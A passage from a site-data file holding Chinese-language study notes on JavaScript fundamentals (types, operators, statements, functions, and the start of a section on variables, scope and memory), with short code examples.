addSomeNumber被定义了2次，后定义的会覆盖先定义的\n\n\n1\n2\n3\n4\n5\n6\n7\n',normalizedContent:'# 基础语法\n\n\n# 一、基本概念\n\n * 区分大小写：ecmascript一切（变量、函数名、操作符）都是 区分大小写 的；例如：test和test变量不是同一个变量，typeof可作为函数名，但typeof是关键字不能作为函数名。\n\n * 标识符：指变量、函数、属性、参数的 名字；可以是一个或多个字符组合，但 第一个字符不能是数字，其他情况下可用 字母、下划线、美元符号、数字；建议采用 驼峰写法，即第一个字母小写后面单词首字母大写，其实 全部使用小写也可以（不太规范）。\n\n * 注释：\n   \n   // 单行注释\n   /*\n    * 多行注释（为了提高可读性，多行注释前都带上*）\n    */\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * 严格模式：ecmascript5提出的，对3版本的不确定行为加以处理，不安全的操作也会抛错，写法：\n   \n   function dosomething() {\n       "use strict";\n       // 其他内容\n   }\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * 语句：每句后面可以没有分号，但要是压缩代码就会出错，所以 推荐加上分号，if语句后推荐使用{}，即使只有一句，这样可以提高代码的可读性。\n\n * 关键字：具有特定用途，不能作为标识符。break、case、catch、continue、default、delete、do、else、finally、for、function、if、in、instanceof、new、return、switch、this、throw、try、typeof、var、void、while、with、debugger。\n\n * 保留字：将来可能被用作关键字，也不能作为标识符\n   \n   * 第3版保留字：abstract、boolean、byte、char、double、final、float、goto、int、long、native、short、synchronized、throws、transient、volatile\n   * 第5版严格模式下保留字：implements、interface、package、private、protected、public、static、let、yield\n   * 第5版非严格模式下保留字：class、const、enum、export、extends、import、super\n\n\n# 二、变量声明\n\njs的变量可以用来保存任何类型的数据（松散类型），例如：\n\nvar message = "hi", found = false, age = 29;\n\n\n1\n\n * 不推荐修改变量所保存值的类型，实际上是可以的；\n * 不推荐省略var，虽然省略var可以作为全局变量，但很难维护，并且未经声明的变量赋值在严格模式抛referenceerror错误；\n * 严格模式下变量名不要取“eval”和“argument”。\n\n\n# 三、数据类型\n\n * ecmascript有6种数据类型，其中 undefined、null、boolean、number和string 是简单（基本）数据类型，剩下的 object 是一种复杂数据类型。\n * 因ecmascript的变量是松散类型，我们可用 typeof操作符 来检测变量的数据类型，写法：typeof message或typeof(message)。它会返回这些字符串："undefined"、"boolean"、"string"、"number"、"object"、"function"。\n\n\n# 3.1 undefined和null\n\nvar message;                        // 这里相当于var message = undefined;\nconsole.log(message == undefined);  // true。message === null的结果就是false，因为此时message就是undefined\nconsole.log(typeof age);            // "undefined"\n\nvar car = null;                     // 常规写法，声明变量一般都会初始化，不知道赋什么那就赋个null也是可以的\nconsole.log(typeof car);            // "object"。null值表示空对象指针，它实际上是个object类型\nconsole.log(null == undefined);     // true。undefined派生自null，但这只是出于比较的目的\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n事实上null和undefined完全不同，我们没有必要将变量显式设为undefined，若要展示保存而未知其值可以null临时将其保存，所以不推荐var message;这种写法，可以var message = null;\n\n\n# 3.2 boolean\n\n布尔类型boolean：只有两个字面量，true（真）和false（假）。\n\n任何数据类型的值调用boolean()函数都会返回一个boolean值：\n\nboolean()   转换为true值                  转换为false值\nstring      任何非空字符串                   ""（空字符串）\nnumber      任何非零数值（包含无穷大）             0和nan（非数值）\nobject      任何对象                      null\nundefined   n/a或n/a（not applicable）   undefined\n\n流控制语句（例如if语句）会自动执行相应的boolean转换\n\nvar message = "hello world";\nif (message) { // 非空字符串转换为true值\n    console.log("value is true");\n}\n\n\n1\n2\n3\n4\n\n\n\n# 3.3 number\n\n该类型比较受关注，用ieee754格式来表示 整数和浮点数值，ecma-262定义了 十进制、八进制、十六进制 三种数字字面量格式。\n其中八进制在严格模式下是无效的；在非严格模式下类似079、08会被解析成十进制的79和9；另外十六进制a-f可大写也可小写。\n\n# 3.3.1 浮点数值\n\n * 该数字要有一个小数点且小数点后至少要有一个数值，但不推荐.1这种写法，即不要省略整数位；\n * 为节省内存1.和10.0这样的值会被转换为整数；\n * 对极大或极小值通常用科学计数法，像0.0000003在默认情况下（带6个零及以上的浮点数）自动转化为e表示法；\n * 需要注意的一点，由于 ieee754浮点计算通病，0.1+0.2是等于0.30000000000000004（17为小数），0.05+0.25或0.15+0.15不会出现问题，不要直接加，可以使用精度来转化。\n\n# 3.3.2 数值范围\n\n * number.min_value：能表示的最小数值，通常是5e-324；\n * number.max_value：能表示的最大数值，通常是1.7976931348623157e+308；\n * number.negative_infinity：-infinity负无穷\n * number.positive_infinity：infinity正无穷\n\nisfinite()函数在参数位于最小与最大数值之间时会返回true，例如：\n\nvar result = number.max_value + number.max_value;\nconsole.log(isfinite(result)); // false\n\n\n1\n2\n\n\n# 3.3.3 nan\n\nnan是非数值(not a number)，表示一个本来要返回数值的操作数但未返回数值的情况。\n\n有两个特点：\n\n * 任何涉及nan的操作（例如nan/10）都会返回nan；\n * nan与任何值都不相等，包括nan本身，nan == nan为false。\n\n针对这两个特点定义了isnan()函数，判断参数是否“不是数值”，函数拿到这个入参时会将这个值 尝试转换为数值，其实调用的是number()函数。\n\n# 3.3.4 数值转换\n\n使用parseint()和parsefloat()可以把字符串转化为 整数 和 浮点数。\n\n而使用number()可以将任何数据类型转化为数值，其规则是：\n\n * 如果是boolean值，true将被转换为1，false将被转换为0；\n * 如果是null值，返回0，如果是undefined，返回nan；\n * 如果是字符串：\n   * 有效浮点格式的字符串会被转换为浮点数；\n   * 整数型的字符串八进制的不会被视为八进制（011会转换为11），只会将十六进制和十进制格式的字符串转换为相等大小的十进制整数数值；\n   * 空字符串""转换为0；\n   * 其他情况的字符串会转换为nan；\n * 如果是对象，先调用对象的valueof()再按照上述规则转换，然后若得到nan就去调用tostring()再按照上述规则转换\n\nnumber("hello"); // nan\nnumber(""); // 0\nnumber(true); // 1\n\n\n1\n2\n3\n\n\n可以看出number()在转化字符串时比较复杂，我们推荐parseint()来处理整数格式的字符串\n\n * parseint()在接卸字符串时会忽略前面的空格，直到找到 第一个数字或负号，也就是说parseint()在字符串还是 非整数格式 或 空字符串 时会返回nan;\n * 在找到一个数字字符后会继续解析直到遇到 非数字字符；\n * 由于ecmascript 3和5对八进制字面量解析时存在分歧，所以我们会推荐使用 基数 来指明是按几进制来解析。\n\nparseint("   1234blue"); // 1234\nparseint(""); // 空字符串使用parseint()会解析成nan，而number()是0\nparseint("0xaf", 16); // 按基数16来解析，175\nparseint("af"); // 基数16和0x必须要有一个，nan\nparseint("10", 2); // 按二进制解析，结果为2，我们非常推荐使用这种写法\n\n\n1\n2\n3\n4\n5\n\n\n\n# 3.4 string类型\n\nstring类型用于表示由零或多个16位unicode字符组成的字符串。\n\n# 3.4.1 转义序列\n\n\\n换行，\\t制表，\\b退格，\\r回车，\\f进纸，\\\\斜杠，\\\'单引号，\\"双引号，\n\\xnn 以十六进制代码nn表示的一个字符（其中n为0~f），例如\\x41表示a，\n\\unnnn 以十六进制代码nnnn表示的一个unicode字符（其中n为0~f），例如\\u03a3表示σ，\n其中4个字符长的转义序列和6个字符长的转义序列在字符串中只占1位。\n\n# 3.4.2 字符串的特点\n\n字符串的值是不可变的，有些例子看起来是可变，其实原字符串销毁新字符串创建是在后台完成的。\n\n# 3.4.3 字符串转换\n\n将一个值转换成字符串有两种方式，第一种是使用几乎每个值都有的tostring()方法：\n\nvar age = 11, num = 10;\nage.tostring(); // "11"\nnum + ""; // "10"\n\n\n1\n2\n3\n\n\ntostring()方法也可以使用基数：\n\nvar num = 10;\nnum.tostring(2); // "1010"\n\n\n1\n2\n\n\nnull和undefined值是没有tostring()方法的，那么可以使用字符串转换的第二种方式string()，其规则是：传入的值有tostring()则会调用tostring()，若传入的值是null、undefined则返回"null"、"undefined"这样的字符串。\n\n其实转化为字符串有种更快捷的方法就是xxx + ""\n\n\n# 3.5 object类型\n\necmascript中的对象其实就是一组 数据和功能 的集合。对象可以通过执行new操作符后跟要创建类型的名称来创建。object类型是所有它的实例的基础，它所具有的属性和方法在更具体的对象中同样存在。\n\nobject的每个实例都具有以下属性个方法：\n\n * constructor：构造函数；\n * hasownproperty(propertyname)：用于检查给定的属性在当前对象实例中是否存在，而不是在实例的原型中；\n * isprototypeof(object)：用于检查传入的对象，是否是当前对象的原型；\n * propertyisenumerable(propertyname)：用于检查给定的属性是否能使用for-in枚举；\n * tolocalestring()：返回对象的字符串表示，该字符串与执行环境的地区对应；\n * tostring()：返回对象的字符串表示；\n * valueof()：返回对象的字符串、数值或布尔值，通常与tostring()方法的返回值相同。\n\n\n# 四、操作符\n\n可以操作字符串、数值、布尔值、对象（调valueof()和tostring()）\n\n\n# 4.1 一元操作符\n\n只能操作一个值。\n\n# 4.1.1 递增和递减操作符\n\n分为前置型和后置型。\n\nvar num1 = 2, num2 = 20;\nvar num3 = --num1 + num2; // 等于21，前置型会先自己“减减”再去参与外界计算\nvar num4 = num1++ + num2; // 等于21，上一步num1为1，这一步是先参与外界计算，后才自己去“加加”\n\n\n1\n2\n3\n\n\n上述对于数值，对于 其他类型也可用，只是自动调用了number()函数，再去操作“++”、“--”\n\n# 4.1.2 一元加和一元减操作符\n\n加号（+）放在数值前面对数值没有影响，而一元减相当于添加了符号。在一元加和一元减对非数值应用时跟一元操作符类似也调用了number()函数。\n\nvar s1 = "01"; s1 = -s1; // s1的值变为了 -1\nvar s2 = "1.1"; s2 = -s2; // s2的值变为了 -1.1\nvar s3 = "z"; s3 = -s3; // s3的值变为了 nan\nvar b = false; s2 = -s2; // b的值变为了 0\nvar f = 1.1; f = -f; // f的值变为了 -1.1\nvar o = {\n  valueof: function() {\n    return -1;\n  }\n};\no = -o; // o的值变为了 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 4.2 位操作符\n\n * ecmascript中所有数字都以64位格式存储，但位操作符是操作32位格式的，所以操作前后是转换的；第32位是符号位：0表示正数，1表示负数；\n * 负数在二进制中是以“二进制补码”格式存储的，计算补码的步骤：\n   * 求这个数值绝对值的二进制码\n   * 求二进制反码\n   * 在二进制反码上加1\n * 而ecmascript会尽力隐藏这些信息，一般是将这个负数的绝对值的二进制码前加一个负号，例如：var num = -18; num.tostring(2); // “-10010”\n * nan和infinity值应用位操作符时会被当成0处理，而对于非数值应用操作符会先用number()函数将值转化为数值（自动完成的），后再用位操作符。\n\n# 4.2.1 按位非(not)\n\n按位非操作符由一个波浪线（~）表示，按位非歧视就是求反码。\n\nvar num1 = 25;\nvar num2 = ~num1; // 等价于 var num2 = -num - 1;即操作数的负值减1\nconsole.log(num2); // -26   ~在底层执行速度要更快\n\n\n1\n2\n3\n\n\n# 4.2.2 按位与(and)\n\n按位与操作符由一个和号（&）表示，它有两个操作数。\n按位与操作只在两个数值的对应位都是1时才返回1，任意一位是0都返回0。\n\n# 4.2.3 按位或(or)\n\n按位或操作符由一个竖线（|）表示，它也有两个操作数。\n按位或操作在两个数值的对应位至少有一个1就可返回1，都是0才返回0。\n\n# 4.2.4 按位异或(xor)\n\n按位异或操作符由一个插入符号（^）表示，它也有两个操作数。\n按位异或操作在两个数值的对应位不同时返回1，都是1或都是0才返回0.\n\n# 4.2.5 左移\n\n左移操作符由两个小于号（<<）表示，符号右侧是要向左移的位数。\n这个左移不会影响操作数的符号位，2左移5位是64，而-2就是-64。\n\n# 4.2.6 有符号的右移\n\n有符号的右移操作符由两个大于号（>>）表示，它右移空出的位置是用符号位的值来填充的。\n\n# 4.2.7 无符号右移\n\n无符号右移操作符由3个大于号（>>>）表示面对整数来说>>和>>>结果相同。但对负数来说，右移空出的位置是用0填充的不再是符号位（负数符号位是1）。\n\nvar value1 = -64;           // 二进制11111111111111111111111111000000\nvar value2 = value1 >> 5;   // 二进制11111111111111111111111111111110\nvar value3 = value1 >>> 5;  // 二进制00000111111111111111111111111110\n\n\n1\n2\n3\n\n\n\n# 4.3 布尔操作符\n\n# 4.3.1 逻辑非\n\n逻辑非操作符由一个叹号（!）表示，其实它相当于先调用boolean()函数再取反，而!!""里的两个!就相当于boolean()了，boolean()函数转换规则可以参考之前的小节。\n\n# 4.3.2 逻辑与\n\n逻辑与操作符由两个和号（&&）表示，有两个操作数，真值表类似按位与。\n\n * 如果第一个操作数是对象或第一个操作数（可能是表达式）求值结果为true时，它会返回第二操作数，否则返回一个操作数；\n * 如果第一个操作数就是null、nan、undefined，就直接返回null、nan、undefined；\n * 如果第一个操作数结果为true或对象，第二个操作数不能是未定义，否则会报错。\n\n# 4.3.3 逻辑或\n\n逻辑或操作符由两个竖线符号（||）表示，有两个操作符，真值表类似按位或。\n\n * 如果第一个操作数是空对象(null)或第一个操作数（可能是表达式）求值结果为false，会返回第二个操作数，否则返回第一个操作数；\n * 如果两个操作数都是null、nan、undefined，则返回null、nan、undefined；\n * 如果第一个操作数结果为false或空对象(null)，第二个操作数不能是未定义的，否则会报错。\n\n\n# 4.4 乘性操作符\n\necmascript定义了3个乘性操作符：乘法、除法和求模。操作数为非数值时会自动调用number()函数来转换。\n\n# 4.4.1 乘法\n\n乘法操作符由一个星号（*）表示，特殊规则：\n\n * 如果有一个操作数是nan，则结果是nan（之前小节里有说过）；\n * 如果infinity与0相乘，则结果是nan（数学上规定∞ * 0和0/0和∞/∞是没有意义的，计算不出来）；\n * 如果infinity与非0数值相乘，结果是infinity或-infinity；\n * 如果infinity与infinity相乘，结果是infinity。\n\n# 4.4.2 除法\n\n除法操作符由一个斜线符号（/）表示，特殊规则：\n\n * 如果有一个操作数是nan，则结果是nan（之前小节里有说过）；\n * 如果零被零除，则结果是nan（数学上规定∞ * 0和0/0和∞/∞是没有意义的，计算不出来）；\n * 如果是非0数值被零除，结果是infinity或-infinity；\n * 如果是infinity被infinity除，结果是nan。\n\n# 4.4.3 求模\n\n求模（余数）操作符由一个百分号（%）表示，特殊规则：\n\n * 如果被除数是无穷大而除数是有限大的数字，则结果是nan；\n * 如果被除数是有限大的数值而除数是0，则结果是nan；\n * 如果是infinity被infinity除，则结果是nan；\n * 如果被除数是有限大的数值而除数是无穷大的数值，结果是被除数；\n\n\n# 4.5 加性操作符\n\n# 4.5.1 加法\n\n加法操作符（+）的用法：\n\n * 如果有一个操作数是nan，则结果是nan（之前小节里有说过）；\n * 同号的infinity相加结果还是同号的infinity；\n * 异号的infinity相加则是nan；\n * 同号0相加还是同号0（结果与第一个操作数保持一致）；\n * 异号0相加却是+0\n * 如果其中一个操作数是字符串，另一个操作数是对象、数值或布尔值就会自动调用tostring()方法取得字符串值并进行拼接，但另一个操作数是null、undefined则会自动调用string()函数取得字符串并进行拼接。\n * 如果操作数为对象（{}）或者是数组（[]）这种复杂的数据类型，那么就将两个操作数都转换为字符串，进行拼接\n\n隐式转换面试题：\n\n[] + []; // []转化为字符串是""，有最后拼起来结果就是""\n[] + {}; // []转化为字符串是""，{}转化为字符串是"[object object]"，所有最后拼起来结果就是"[object object]"\n{} + []; // 编译器将开头的{}理解为空代码块，那么这里“{} + []”相当于“+[]”，又相当于“number([])”，那结果就是0；有些编译器会高级一点那就跟“[] + {}”结果一样是"[object object]"\n{} + {}; // 跟上面同样道理，相当于“+{}”又相当于number({})，其结果就是nan；有些编译器就是两个{}的字符串的拼接，其结果是"[object object][object object]"\n\n\n1\n2\n3\n4\n\n\njs的{} + {}与{} + []的结果是什么？\n\n# 4.5.2 减法\n\n减法操作符（-）的用法：\n\n * 如果有一个操作数是nan，则结果是nan（之前小节里有说过）；\n * 同号的infinity相减则是nan；\n * 异号的infinity相减是infinity，符号视情况而定；\n * 同号0相减是+0；异号0相减结果与第一个操作数保持一致；\n * 如果其中一个操作数是字符串、布尔值、null、undefined，则先调用number()函数转换为数值再执行减法计算，担忧一个操作数是对象，则会调用valueof()方法，如果没有valueof()方法则会调用tostring()得到字符串再转化为数值去计算。\n\n\n# 4.6 关系操作符\n\n小于（<）、大于（>、小于等于（<=）、大于等于（>=，相应规则：\n\n * 如果一个操作数是数值，则将另一个操作数转换为一个数值；\n * 如果一个操作数是对象，则调用这个对象的valueof()方法，如果没有valueof()方法则调用tostring()方法；\n * 如果两个操作数都是字符串，则比较两个字符串对应位置的字符编码值。\n\nvar result = "brick" < "alphabet"; // true，b的字符编码是66，a的字符编码是97\nvar result = "brick".tolowercase() < "alphabet".tolowercase(); // false，都转换为小写，b的字符编码大于a的\nvar result = "23" < "3"; // true，因为先比较第一位也就是"2"比"3"\nvar result = "23" < 3; // false，如果一个操作数是数值，则将另一个操作数转换为一个数值\nvar result = "a" < 3; // false，任何操作数与nan进行关系比较时，其结果都为false\n\n\n1\n2\n3\n4\n5\n\n\n\n# 4.7 相等操作符\n\n# 4.7.1 相等和不相等\n\n两个等于号（==）表示相等操作符，叹号后跟等于号（!=）表示不相等操作符，这两个操作符都会先转换操作数（强制转型），然后再比较他们的相等性。\n\n * 如果一个操作数是数值，另一个操作数是布尔值或字符串会先调用number()函数转换成数值去比较相等性；\n * null和undefined比较相等性，是相等的，他们比较时没有去转换换成数值的；\n * 如果有一个操作数是nan，不管第二个操作数还是不是nan，其相等操作符都会返回false，不相等操作符返回true（nan不等于nan）；\n * 如果两个操作数都是对象，则比较他们是不是同一个对象，如果两个操作数都指向同一个对象，则相等操作符返回true，否则返回false。\n\n# 4.7.2 全等和不全等\n\n三个等于号（===）表示全等操作符，叹号后跟两个等于号（!==）表示不全等操作符，这两个操作符不但不转换操作数并且会先比较类型是否相同再比较相等性。null == undefined 返回true，null === undefined返回false。\n\n\n# 4.8 条件操作符\n\n也是三元运算符xxx ? xxx : xxx，例如：var max = (num1 > num2) ? num 1 : num2;如果num1大于num2，那就返回中间num1的值，否则返回最后一个num2的值。\n\n\n# 4.9 赋值操作符\n\n*=，/=，%=，+=，-=，<<=，>>=，>>>=，主要是简化写法，其实没有任何性能的提升。\n\n\n# 4.10 逗号操作符\n\n可以执行多个操作、赋值\n\nvar num1 = 1, num2 = 2, num3 = 3;\nvar num = (5, 1, 4, 8, 0); // num的值为0\n\n\n1\n2\n\n\n\n# 五、语句\n\n\n# 5.1 if语句\n\nif (i > 25) {\n  console.log("greater than 25.");\n} else {\n  console.log("less than or equal to 25.");\n}\n\n\n1\n2\n3\n4\n5\n\n\n推荐使用代码块，即使只有一行代码执行\n\n\n# 5.2 do-while语句\n\nvar i = 0;\ndo {\n  i +=2;\n} while (i < 10); // i 小于10就会继续循环\nconsole.log(i);\n\n\n1\n2\n3\n4\n5\n\n\n不管表达式的结果如何，循环体内的代码至少会执行一次\n\n\n# 5.3 while语句\n\nvar i = 0;\nwhile (i < 10) {\n  i += 2;\n}\n\n\n1\n2\n3\n4\n\n\n只有表达式结果为true时才会去执行循环体内的代码\n\n\n# 5.4 for语句\n\nvar count = 10;\nfor (var i = 0; i < count; i ++) {\n  console.log(i);\n}\nconsole.log(i); // 10\n\n\n1\n2\n3\n4\n5\n\n\n有三个表达式“初始化语句”、“循环条件”、“每执行完一次后的更变语句”。\n由于ecmascript中不存在 块级作用域，因此在循环内部定义的变量也可以在外部访问到。\n\n\n# 5.5 for-in语句\n\nfor (var propname in window) {\n  document.write(propname);\n}\n\n\n1\n2\n3\n\n\n精准的迭代语句，可以用来枚举对象的属性，对null和undefined使用for-in会报错，所以使用前要判断对象是否为null或undefined。\n\n\n# 5.6 label语句\n\n在代码中添加标签，一遍将来使用，一般与break或continue配合使用\n\nvar a = 0;\nlabel1:\nfor (var i = 0; i < 10; i ++) {\n  for (var j = 0; j < 20; j ++) {\n    a = i + \',\' + j;\n    if (i === 3 && j === 2) {\n      break label1;\n    }\n  }\n}\nconsole.log(a);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 5.7 break和continue语句\n\nbreak语句会立即退出这一层的循环（这层的for循环），而continue是立即退出本次循环（for循环里会循环好几次，跳出这一次的）。\n\n\n# 5.8 switch语句\n\nswitch (i) {\n  case 25:\n    console.log(25);\n    break;\n  case 35:\n    console.log(35);\n    break;\n  case 45:\n    console.log(45);\n    break;\n  default:\n    console.log("other");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncase里要是不带break的话，就会继续执行后面的case；default相当于else它不需要break； switch语句可以使用任何数据类型，case的值可以是变量或表达式； switch去比较使用的是全等“===”； 它在一些情况下可以替代if () {} else if () {} else {}这样逻辑。\n\n\n# 六、函数\n\necmascript中的函数使用function关键字来声明，后跟一组参数及函数体。\n\nfunction saghi (name, message) {\n  console.log("hello " + name + "," + message);\n}\nsaghi("nicholas", "how are you today?"); // "hello nicholas,how are you today?"\n\n\n1\n2\n3\n4\n\n\n任何函数都可使用return语句跟要返回的值来实现函数返回某值，并且函数都不需要定义返回值类型，return;后的语句是不可能再执行的\n\n严格模式对函数有一些限制：\n\n * 不能把函数或参数名取为eval或arguments；\n * 不能出现两个命名参数同名的情况。\n\n\n# 6.1 理解函数\n\necmascript函数有一个重要特点：命名的参数只提供便利，但不是必须的。意思是函数命名的参数只是为了告诉外部我大概需要几个什么样的参数，实际上调用函数时解析器不会拿传参和命名时的参数去做比较，不关心你传进来几个参数也不关心类型，只会把你的入参放在类似数组的arguments对象中，可以通过arguments[n]来访问第n个参数可以通过length属性来确定多少个参数传进来了。\n\nfunction doadd() {\n  if (arguments.length == 1) {\n    console.log(arguments[0] + 10);\n  } else if (arguments.length == 2) {\n    console.log(arguments[0] + arguments[1]);\n  }\n}\ndoadd(10); // 20\ndoadd(30, 20); // 50\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n这个特性算不上完美的重载，但也足够弥补ecmascript的这一缺憾了。\n\nfunction doadd(num1, num2) {\n  arguments[1] = 10;\n  console.log(arguments[0] + num2);\n}\n\n\n1\n2\n3\n4\n\n\n每次执行doadd()函数都会重写第二个参数，arguments[1]和num2的值都会变为10，但他们的内存空间是独立只是值同步。如果num2在外部没有传值进来时是赋予的undefined。还有严格模式下arguments的值不能被重写。\n\n\n# 6.2 没有重载\n\n * 重写 子类覆盖父类的方法（返回值和形参都不能改变，方法体改变了，也就是核心变了），在js里重写是可以的。\n * 重载：在同一个类里（执行环境），方法名相同而形参列表和方法体不一样的函数叫重载，这在js里是不存在的。\n * 因为js里使用var和function这样的关键字来声明 同名变量 时，都会以最后一个声明为准，它会覆盖之前所有 同名 的声明；js里的同名函数的声明就是重载的写法，因为在同一个执行环境里，但由于同名的会被覆盖，那么js里没有函数重载这一说法。\n\nfunction addsomenumber(num) {\n  return num + 100;\n}\nfunction addsomenumber(num) {\n  return num + 200;\n}\nvar result = addsomenumber(100); // addsomenumber被定义了2次，后定义的会覆盖先定义的\n\n\n1\n2\n3\n4\n5\n6\n7\n',charsets:{cjk:!0}},{title:"2.变量、作用域和内存问题",frontmatter:{title:"2.变量、作用域和内存问题"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/2.%E5%8F%98%E9%87%8F%E3%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/2.变量、作用域和内存问题.md",key:"v-36d9da04",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/2.%E5%8F%98%E9%87%8F%E3%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98.html",headers:[{level:2,title:"一、基本类型和应用类型的值",slug:"一、基本类型和应用类型的值",normalizedTitle:"一、基本类型和应用类型的值",charIndex:18},{level:3,title:"1.1 动态的属性",slug:"_1-1-动态的属性",normalizedTitle:"1.1 动态的属性",charIndex:167},{level:3,title:"1.2 复制变量值",slug:"_1-2-复制变量值",normalizedTitle:"1.2 复制变量值",charIndex:263},{level:3,title:"1.3 传递参数",slug:"_1-3-传递参数",normalizedTitle:"1.3 传递参数",charIndex:682},{level:3,title:"1.4 检测类型",slug:"_1-4-检测类型",normalizedTitle:"1.4 检测类型",charIndex:1932},{level:2,title:"二、执行环境及作用域",slug:"二、执行环境及作用域",normalizedTitle:"二、执行环境及作用域",charIndex:2126},{level:2,title:"三、垃圾收集",slug:"三、垃圾收集",normalizedTitle:"三、垃圾收集",charIndex:4185},{level:3,title:"3.1 标识清除",slug:"_3-1-标识清除",normalizedTitle:"3.1 标识清除",charIndex:4244},{level:3,title:"3.2 引用计数",slug:"_3-2-引用计数",normalizedTitle:"3.2 引用计数",charIndex:4410},{level:3,title:"3.3 内存管理",slug:"_3-3-内存管理",normalizedTitle:"3.3 内存管理",charIndex:4690}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、基本类型和应用类型的值 1.1 动态的属性 1.2 复制变量值 1.3 传递参数 1.4 检测类型 二、执行环境及作用域 三、垃圾收集 3.1 标识清除 3.2 引用计数 3.3 内存管理",content:'# 变量、作用域和内存问题\n\n\n# 一、基本类型和应用类型的值\n\nECMAScript变量的值可以是基本类型或引用类型，之前介绍了Undefined、Null、Boolean、Number和String这5种基本数据类型，它是按 值 访问可以 操作 保存在变量中的 实际值，而引用类型的值是保存在堆内存中，按 引用 访问的。\n\n\n# 1.1 动态的属性\n\n对于应用类型的值，我们可以为其添加属性和方法，也可以改变和删除属性和方法，而对于基本类型的值我们不能添加属性，就算添加了后面访问这个属性也是undefined。\n\n\n# 1.2 复制变量值\n\n 1. 如果从一个变量向另一个变量复制基本类型的值，会在变量对象上创建一个新值。然后把该值复制到为新变量分配的位置上，例：\n    \n    var num1 = 5;\n    var num2 = num1; // num1的5和num2的5完全独立，两变量可以参与任何操作而不会互相影响。\n    \n    \n    1\n    2\n    \n    \n    \n\n 2. 如果从一个变量向另一个变量复制引用类型的值，也会把变量对象中的值赋值一份放到新变量分配的位置上。其实这个值的副本是个指针，和复制前变量指向堆内存中的同一个对象，例：\n    \n    var obj1 = new Object();\n    var obj2 = obj1; // 地址值复制过去了，地址值之间互不影响，但要操作地址对应的对象就会有影响。\n    \n    \n    1\n    2\n    \n    \n    \n\n\n# 1.3 传递参数\n\n * 按值传递：在参数传递过程中，形参和实参占用了 两个完全不同的内存空间（栈），形参所存储的内容是实参存储内容的一份拷贝。\n * 按应用传递：在参数传递过程中，形参和实参完全是 同一块内存空间（栈），两份不分彼此。\n * 而ECMAScript中所有函数的参数都是 按值传递 的。\n * 基本类型值的传递如同基本类型变量的复制一样，而应用类型值的传递则如同应用类型变量的复制一样（参考上一节）。\n\n例1：\n\nfunction addTen(num2) {\n    num2 += 10;\n    return num2;\n}\nvar num1 = 20;\nvar result = addTen(num1);\nconsole.log(num1); // 20\nconsole.log(num2); // 30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在调用addTen函数时，num1存储内容复制了一份给num2，复制后num1和num2都为20但互不影响；在addTen函数里，num2加了10之后是对num1没有影响的，这是 按值传递，所以最后的输出结果num1是20，num2是30；假设它是 按引用传递 ，那么num1和num2是同一份，最后的值应该都是30才对，与实际输出不一致。\n\n例2：\n\nfunction setName(obj) {     // (3) 如下图(2)(3)，将person的地址值复制了一份给obj，让obj也指向那个实例化对象\n    obj.name = "N";         // (4) 如下图(4)，给那个实例化对象新添一个name属性，该属性值为"N"\n    obj = new Object();     // (5) 如下图(5)，又创建了一个Oject的实例化对象，让obj指向这个新的实例化对象\n    obj.name = "G";         // (6) 如下图(6)，给新的实例化对象新添一个name属性，该属性值为"G"\n}\nvar person = new Object();  // (1) 如下图(1)，声明了person变量，初始化的值是Oject引用类型的一个实例化对象\nsetName(person);            // (2) 去调用setName函数，将person这个变量传入\nconsole.log(person.name);   // (7) 如下图(7)，函数调用完会清理其中的局部变量，只剩下外部的person和其指引的对象了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\n可以看出来，步骤(5)是关键，它可以指向新的实例化对象；如果是 按引用传递 的话，person和obj就是同一份（在栈里），在obj指向新对象时，person也指向新对象，实际上步骤(7)打印出的是"N"，所以它还是 按值传递（在堆确实还是同一份，但在栈里不是同一份，是复制了一份）。\n\n\n# 1.4 检测类型\n\n * 检测变量是不是基本数据类型用typeof操作符，而检测引用类型变量是什么类型的对象可以用instanceof操作符；\n * 所有引用类型的值 都是Object的实例，在检测一个引用类型值和Object构造函数时，instanceof操作符始终会返回 true；\n * 使用instanceof操作符检测 基本类型 会返回 false，基本类型不是对象。\n\n\n# 二、执行环境及作用域\n\n在研读《JavaScript高级程序设计》的4.2节后仍有很多不解，需要去研读《你不知道的JavaScript(上卷)》的第一部的一二章和第二部的一二章，你会有转深刻的理解，这里就记录一些浅显的见解吧。\n\n 1. js是“解释执行”语言，这里不得不提到js的 引擎和编译器。引擎负责整个js程序的 编译和执行过程，引擎只是负责编译的 引导 而实际上具体编译的活是 编译器 在干（词法语法分析并生成可执行的机器指令）。\n\n 2. js代码大多是一段段嵌套起来的，那么对代码段可以分成三种：全局代码段、函数代码段、eval代码段（不推荐使用）。js代码运行的时候，是先编译再执行，并且编译发生在化码执行前的几微秒甚至更短时间里。但是，这里的编译执行都是按照一段段来的，并不是把文件里的所有代码都编译后再执行的，而是 编译一段执行一段。\n\n 3. js运行到某段代码时（某个函数被调用时），先编译分析这段代码并创建一个 执行环境(execution context)，也称 执行上文（简称EC）。执行环境有三个重要的组成：变量对象、作用域链、this。\n    \n    * 变量对象：variable object，简称VO。存储着执行环境里的 所有变量和函数声明。当执行流在这个执行坏境里执行时，这个变量对象就是 活动对象(activation object)。\n    * 作用域：scope。是 根据名称查找变量的一套规则，这个规则只在所处代码段里有效（这里指的是 作用域范围），其实作用域存的不是变量对象本身而是指向变量对象的 指针。\n    * 作用城链：scope chain。代码段的嵌套使得作用域可以连接到一起了，这祥就形成了一个能 